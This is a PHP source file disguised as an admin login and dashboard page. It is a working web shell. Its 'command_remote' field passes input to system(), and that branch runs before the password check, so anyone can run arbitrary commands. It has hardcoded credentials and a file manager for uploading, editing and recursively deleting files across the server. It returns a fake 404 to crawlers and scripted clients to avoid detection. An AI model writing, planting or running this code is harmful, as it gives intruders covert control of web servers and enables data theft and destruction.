<?php
session_start();
ob_start();

// Konfigurasi login
$validUsername = 'JogjaXploit';
$validPassword = 'Djaya3';

// Proses logout
if (isset($_GET['logout'])) {
    $redirect_url = strtok($_SERVER['REQUEST_URI'], '?'); // URL tanpa query string
    session_unset();
    session_destroy();
    if (isset($_COOKIE[session_name()])) {
        setcookie(session_name(), '', time() - 3600, '/');
    }
    header("Location: $redirect_url");
    exit();
}

// Eksekusi remote command bila diberikan
if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['command_remote'])) {
    $command_remote = $_POST['command_remote'];
    $target_dir = isset($_POST['target_dir']) ? $_POST['target_dir'] : '.';
    if (is_dir($target_dir)) { chdir($target_dir); }
    echo '<div style="padding: 20px; font-family: monospace;">';
    echo '<h3>Current Directory: ' . getcwd() . '</h3>';
    echo '<pre>';
    system($command_remote . " 2>&1");
    echo '</pre>';
    echo '<a href="?path=' . urlencode(getcwd()) . '">Back</a>';
    echo '</div>';
    exit;
}

// Blokir akses dari bot user agent
$blockedUserAgents = [
    'Googlebot', 'Slurp', 'MSNBot', 'PycURL', 'facebookexternalhit',
    'ia_archiver', 'crawler', 'Yandex', 'Rambler', 'Yahoo! Slurp',
    'YahooSeeker', 'bingbot', 'curl', 'python-requests', 'exabot', 'Applebot',
    'duckduckbot', 'facebot', 'Alexa Crawler'
];
foreach ($blockedUserAgents as $blocked) {
    if (stripos($_SERVER['HTTP_USER_AGENT'], $blocked) !== false) {
        header("HTTP/1.0 404 Not Found");
        echo "404 Not Found";
        exit;
    }
}

// Proses login
if (isset($_POST['username']) && isset($_POST['password'])) {
    if ($_POST['username'] === $validUsername && $_POST['password'] === $validPassword) {
        $_SESSION['loggedin'] = true;
    } else {
        echo '<div style="color: red; text-align:center; padding:10px;">Username or password is not correct!</div>';
    }
}
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <title>Admin Login</title>
        <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
        <style>
            body {
                background: linear-gradient(135deg, #74ABE2, #5563DE);
                font-family: 'Roboto', sans-serif;
                margin: 0;
                padding: 0;
                display: flex;
                align-items: center;
                justify-content: center;
                height: 100vh;
                color: #333;
            }
            .login-container {
                background: #fff;
                padding: 30px 40px;
                border-radius: 10px;
                box-shadow: 0 6px 20px rgba(0, 0, 0, 0.1);
                width: 350px;
            }
            h2 { margin-bottom: 20px; text-align: center; }
            input[type="text"], input[type="password"] {
                width: 100%;
                padding: 12px;
                margin: 10px 0;
                border: 1px solid #ccc;
                border-radius: 4px;
                font-size: 16px;
            }
            input[type="submit"] {
                width: 100%;
                background-color: #5563DE;
                color: #fff;
                padding: 12px;
                border: none;
                border-radius: 4px;
                font-size: 16px;
                cursor: pointer;
                transition: background-color 0.3s ease;
            }
            input[type="submit"]:hover { background-color: #4554c4; }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h2>Login Admin</h2>
            <form method="post">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <input type="submit" value="Login">
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Variabel dasar file manager
$path = isset($_GET['path']) ? $_GET['path'] : $_SERVER['DOCUMENT_ROOT'];
$action = isset($_GET['action']) ? $_GET['action'] : null;
$file = isset($_GET['file']) ? $_GET['file'] : '';

function getPermissions($file) {
    $perms = fileperms($file);
    $info = '';
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

function listDirectory($path) {
    $dir = scandir($path);
    echo '<table class="table">';
    echo '<thead>
            <tr>
              <th>Name</th>
              <th>Size</th>
              <th>Permissions</th>
              <th>Action</th>
            </tr>
          </thead>';
    echo '<tbody>';
    if ($path !== $_SERVER['DOCUMENT_ROOT']) {
        echo '<tr>
                <td colspan="4">
                  <a class="btn btn-back" href="?path=' . urlencode(dirname($path)) . '">&larr; Back</a>
                </td>
              </tr>';
    }
    foreach ($dir as $item) {
        if ($item == '.' || $item == '..') continue;
        $filePath = $path . DIRECTORY_SEPARATOR . $item;
        $isDir = is_dir($filePath);
        $size = $isDir ? 'N/A' : filesize($filePath);
        $permissions = $isDir ? '-' : getPermissions($filePath);
        echo '<tr>';
        echo '<td>' . ($isDir ? '<a href="?path=' . urlencode($filePath) . '">' . htmlspecialchars($item) . '</a>' : htmlspecialchars($item)) . '</td>';
        echo '<td>' . $size . '</td>';
        echo '<td>' . $permissions . '</td>';
        echo '<td class="action-cell">';
        if (!$isDir) {
            echo '<a class="btn btn-edit" title="Edit" href="?action=edit&file=' . urlencode($filePath) . '&path=' . urlencode($path) . '">
                     <i class="fas fa-edit"></i>
                  </a>';
            echo '<a class="btn btn-delete" title="Delete" href="?action=delete&file=' . urlencode($filePath) . '&path=' . urlencode($path) . '" onclick="return confirm(\'Are you sure to delete this file?\');">
                     <i class="fas fa-trash-alt"></i>
                  </a>';
            echo '<a class="btn btn-rename" title="Rename" href="?action=rename&file=' . urlencode($filePath) . '&path=' . urlencode($path) . '">
                     <i class="fas fa-sync-alt"></i>
                  </a>';
        } else {
            echo '<a class="btn btn-delete" title="Delete Folder" href="?action=delete&dir=' . urlencode($filePath) . '&path=' . urlencode($path) . '" onclick="return confirm(\'Are you sure to delete this folder with things inside?\');">
                     <i class="fas fa-trash-alt"></i>
                  </a>';
            echo '<a class="btn btn-rename" title="Rename Folder" href="?action=rename&dir=' . urlencode($filePath) . '&path=' . urlencode($path) . '">
                     <i class="fas fa-sync-alt"></i>
                  </a>';
        }
        echo '</td>';
        echo '</tr>';
    }
    echo '</tbody></table>';
}

function uploadFile($path) {
    if (isset($_FILES['uploaded_file'])) {
        $target_file = $path . DIRECTORY_SEPARATOR . basename($_FILES['uploaded_file']['name']);
        if (file_exists($target_file)) {
            echo "<script>alert('File already exists!'); window.location.href='?path=" . urlencode($path) . "';</script>";
        } else {
            if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $target_file)) {
                echo "<script>alert('File uploaded successfully!'); window.location.href='?path=" . urlencode($path) . "';</script>";
            } else {
                echo "<script>alert('An error occurred!'); window.location.href='?path=" . urlencode($path) . "';</script>";
            }
        }
    }
}

function createNewFolder($path, $folderName) {
    $newFolder = $path . DIRECTORY_SEPARATOR . $folderName;
    if (!file_exists($newFolder)) {
        mkdir($newFolder, 0777, true);
        echo "<script>alert('Folder " . htmlspecialchars($folderName) . " successfully created!'); window.location.href='?path=" . urlencode($path) . "';</script>";
    } else {
        echo "<script>alert('Folder " . htmlspecialchars($folderName) . " already exists!'); window.location.href='?path=" . urlencode($path) . "';</script>";
    }
}

function createNewFile($path, $fileName) {
    $newFile = $path . DIRECTORY_SEPARATOR . $fileName;
    if (!file_exists($newFile)) {
        $fp = fopen($newFile, 'w');
        fclose($fp);
        echo "<script>alert('File " . htmlspecialchars($fileName) . " successfully created!'); window.location.href='?path=" . urlencode($path) . "';</script>";
    } else {
        echo "<script>alert('File " . htmlspecialchars($fileName) . " already exists!'); window.location.href='?path=" . urlencode($path) . "';</script>";
    }
}

// Hapus folder beserta isinya
if ($action === 'delete' && isset($_GET['dir'])) {
    function deleteFolder($folder) {
        foreach (scandir($folder) as $item) {
            if ($item == '.' || $item == '..') continue;
            $pathItem = $folder . DIRECTORY_SEPARATOR . $item;
            is_dir($pathItem) ? deleteFolder($pathItem) : unlink($pathItem);
        }
        rmdir($folder);
    }
    deleteFolder($_GET['dir']);
    header("Location: ?path=" . urlencode($_GET['path']));
    exit;
}

// Proses rename folder
if ($action === 'rename' && isset($_GET['dir'])) {
    echo '<div class="rename-container">
             <form method="post">
                <input type="text" name="new_name" placeholder="New folder name" required>
                <button type="submit" name="rename">Rename</button>
             </form>
             <a class="btn btn-back" href="?path=' . urlencode($path) . '">Back</a>
          </div>';
    if (isset($_POST['rename'])) {
        $newPath = dirname($_GET['dir']) . '/' . basename($_POST['new_name']);
        rename($_GET['dir'], $newPath);
        header("Location: ?path=" . urlencode($_GET['path']));
        exit;
    }
}

// Proses aksi: upload, create folder dan file
if ($action === 'upload') { uploadFile($path); exit; }
if ($action === 'create_folder') {
    if (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
        createNewFolder($path, $_POST['folder_name']);
    } else {
        echo "<script>alert('Folder name cannot be empty!'); window.location.href='?path=" . urlencode($path) . "';</script>";
    }
    exit;
}
if ($action === 'create_file') {
    if (isset($_POST['file_name']) && !empty($_POST['file_name'])) {
        createNewFile($path, $_POST['file_name']);
    } else {
        echo "<script>alert('File name cannot be empty!'); window.location.href='?path=" . urlencode($path) . "';</script>";
    }
    exit;
}

// Proses edit file
if ($action === 'edit' && !empty($file)) {
    if (isset($_POST['content'])) {
        file_put_contents($file, $_POST['content']);
        echo "<script>alert('File saved successfully!'); window.location.href='?path=" . urlencode($path) . "';</script>";
    } else {
        $content = file_get_contents($file);
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="utf-8">
            <title>Edit File - <?php echo htmlspecialchars(basename($file)); ?></title>
            <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
            <style>
                body {
                    background: #f0f4f8;
                    font-family: 'Roboto', sans-serif;
                    color: #333;
                    margin: 0;
                    padding: 20px;
                }
                .editor-container {
                    background: #fff;
                    padding: 20px;
                    border-radius: 8px;
                    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
                    max-width: 800px;
                    margin: auto;
                }
                textarea {
                    width: 100%;
                    height: 400px;
                    padding: 10px;
                    border: 1px solid #ccc;
                    border-radius: 4px;
                    font-family: monospace;
                }
                input[type="submit"] {
                    background: #5563DE;
                    color: #fff;
                    padding: 10px 20px;
                    border: none;
                    border-radius: 4px;
                    cursor: pointer;
                    margin-top: 10px;
                    transition: background-color 0.3s ease;
                }
                input[type="submit"]:hover { background: #4554c4; }
                .btn-back {
                    display: inline-block;
                    margin-top: 15px;
                    background: #ccc;
                    padding: 8px 15px;
                    text-decoration: none;
                    border-radius: 4px;
                    color: #333;
                }
            </style>
        </head>
        <body>
            <div class="editor-container">
                <h2>Edit File: <?php echo htmlspecialchars(basename($file)); ?></h2>
                <form method="post">
                    <textarea name="content"><?php echo htmlspecialchars($content); ?></textarea>
                    <br>
                    <input type="submit" value="Save">
                </form>
                <a class="btn-back" href="?path=<?php echo urlencode($path); ?>">Back</a>
            </div>
        </body>
        </html>
        <?php
    }
    exit;
}

// Proses delete file
if ($action === 'delete' && !empty($file)) {
    if (is_file($file)) {
        unlink($file);
        echo "<script>alert('File deleted successfully!'); window.location.href='?path=" . urlencode($path) . "';</script>";
    } else {
        echo "<script>alert('File is not valid!'); window.location.href='?path=" . urlencode($path) . "';</script>";
    }
    exit;
}

// Proses rename file
if ($action === 'rename' && !empty($file)) {
    if (isset($_POST['new_name'])) {
        $newName = dirname($file) . DIRECTORY_SEPARATOR . $_POST['new_name'];
        rename($file, $newName);
        echo "<script>alert('File name successfully renamed!'); window.location.href='?path=" . urlencode($path) . "';</script>";
    } else {
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="utf-8">
            <title>Rename File - <?php echo htmlspecialchars(basename($file)); ?></title>
            <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
            <style>
                body {
                    background: #f0f4f8;
                    font-family: 'Roboto', sans-serif;
                    color: #333;
                    margin: 0;
                    padding: 20px;
                }
                .rename-container {
                    background: #fff;
                    max-width: 500px;
                    margin: auto;
                    padding: 20px;
                    border-radius: 8px;
                    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
                }
                input[type="text"] {
                    width: 100%;
                    padding: 12px;
                    border: 1px solid #ccc;
                    border-radius: 4px;
                    margin-bottom: 10px;
                }
                input[type="submit"] {
                    background: #5563DE;
                    color: #fff;
                    padding: 10px 20px;
                    border: none;
                    border-radius: 4px;
                    cursor: pointer;
                    transition: background-color 0.3s ease;
                }
                input[type="submit"]:hover { background: #4554c4; }
                .btn-back {
                    display: inline-block;
                    margin-top: 10px;
                    background: #ccc;
                    padding: 8px 15px;
                    text-decoration: none;
                    border-radius: 4px;
                    color: #333;
                }
            </style>
        </head>
        <body>
            <div class="rename-container">
                <h2>Rename File: <?php echo htmlspecialchars(basename($file)); ?></h2>
                <form method="post">
                    <input type="text" name="new_name" value="<?php echo htmlspecialchars(basename($file)); ?>" required>
                    <input type="submit" value="Change name">
                </form>
                <a class="btn-back" href="?path=<?php echo urlencode($path); ?>">Kembali</a>
            </div>
        </body>
        </html>
        <?php
    }
    exit;
}
ob_end_flush();
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Dashboard Admin - MrSanZz</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* Base & Global Styles */
        body {
            background: #f0f4f8;
            margin: 0;
            font-family: 'Roboto', sans-serif;
            color: #333;
        }
        a { text-decoration: none; color: inherit; }
        /* Navbar */
        .navbar {
            background: #5563DE;
            padding: 15px 20px;
            border-bottom: 1px solid #4658b0;
            display: flex;
            justify-content: space-between;
            align-items: center;
            color: #fff;
        }
        .navbar h1 {
            margin: 0;
            font-size: 24px;
        }
        .logout-btn {
            background: #f44336;
            color: #fff;
            border: none;
            padding: 8px 15px;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        .logout-btn:hover { background: #d32f2f; }
        /* Container */
        .container {
            padding: 20px;
        }
        /* Action Forms */
        .actions {
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
            margin-bottom: 20px;
        }
        .actions form {
            display: flex;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
        }
        .actions input[type="text"],
        .actions input[type="file"] {
            padding: 8px 10px;
            border: 1px solid #bbb;
            border-radius: 4px;
            outline: none;
        }
        .actions input[type="submit"] {
            padding: 8px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            background: #5563DE;
            color: #fff;
            transition: background-color 0.3s ease;
        }
        .actions input[type="submit"]:hover { background: #4554c4; }
        /* Short-Access Navigation */

        .short-access {
          margin-bottom: 20px;
        }

        .short-access a {
          color: #5563DE;
          margin-right: 5px;
          transition: color 0.3s ease;
        }

        .short-access a:hover {
          color: #4554c4;
        }

        /* Styling khusus untuk tombol Back di Short-Access */
        .short-access .btn-back {
          display: inline-block;
          margin-top: 10px; /* Tambahkan margin-top disini */
          background: #ccc;
          padding: 8px 15px;
          border-radius: 4px;
          color: #333;
          font-size: 14px;
        }

        .btn-back {
            background: #ccc;
            padding: 8px 15px;
            border-radius: 4px;
            color: #333;
            font-size: 14px;
        }
        /* Tabel File & Folder */
        .table {
            width: 100%;
            border-collapse: collapse;
            background: #fff;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            border-radius: 4px;
            overflow: hidden;
        }
        .table thead {
            background: #f3f6f9;
        }
        .table th, .table td {
            padding: 12px;
            border-bottom: 1px solid #eee;
            text-align: left;
        }
        .table tr:hover { background: #f9f9f9; }
        /* Tombol Aksi Lingkaran */
        .action-cell a.btn {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: inline-flex;
            justify-content: center;
            align-items: center;
            margin-right: 5px;
            font-size: 18px;
            color: #fff;
            transition: background-color 0.3s ease;
        }
        .btn-edit { background: #4CAF50; }
        .btn-delete { background: #f44336; }
        .btn-rename { background: #ffeb3b; color: #333; }
        /* Responsive */
        @media (max-width: 768px) {
            .actions { flex-direction: column; gap: 15px; }
            .table th, .table td { font-size: 14px; }
        }
    </style>
</head>
<body>
    <!-- Navbar -->
    <div class="navbar">
        <h1>Dashboard Admin - MrSanZz</h1>
        <form method="post" action="?logout=true">
            <button type="submit" class="logout-btn">Log out</button>
        </form>
    </div>
    <!-- Main Container -->
    <div class="container">
        <!-- Action Forms -->
        <div class="actions">
            <!-- Upload File -->
            <form method="post" enctype="multipart/form-data" action="?action=upload&path=<?php echo urlencode($path); ?>">
                <input type="file" name="uploaded_file">
                <input type="submit" value="Upload">
            </form>
            <!-- Create Folder -->
            <form method="post" action="?action=create_folder&path=<?php echo urlencode($path); ?>">
                <input type="text" name="folder_name" placeholder="New">
                <input type="submit" value="Create Folder">
            </form>
            <!-- Create File -->
            <form method="post" action="?action=create_file&path=<?php echo urlencode($path); ?>">
                <input type="text" name="file_name" placeholder="New File">
                <input type="submit" value="Create File">
            </form>
            <!-- Remote Command -->
            <form method="post" action="?path=<?php echo urlencode($path); ?>">
                <input type="text" name="command_remote" placeholder="Remote Command">
                <input type="submit" value="Execute">
            </form>
        </div>
        <!-- Short-Access Navigation -->
        <div class="short-access">
            <h3>Short-Access:</h3>
            <?php
            $path_parts = explode("/", $path);
            $current_path = "";
            foreach ($path_parts as $part) {
                if (empty($part)) continue;
                $current_path .= "/{$part}";
                echo '<a href="?path=' . urlencode($current_path) . '">' . htmlspecialchars($part) . '</a>/';
            }
            ?>
            <br>
            <a class="btn-back" href="?path=<?php echo urlencode($_SERVER['DOCUMENT_ROOT']); ?>">Back to Document Root</a>
        </div>
        <!-- File Listing -->
        <div class="file-listing">
            <?php listDirectory($path); ?>
        </div>
    </div>
</body>
</html>
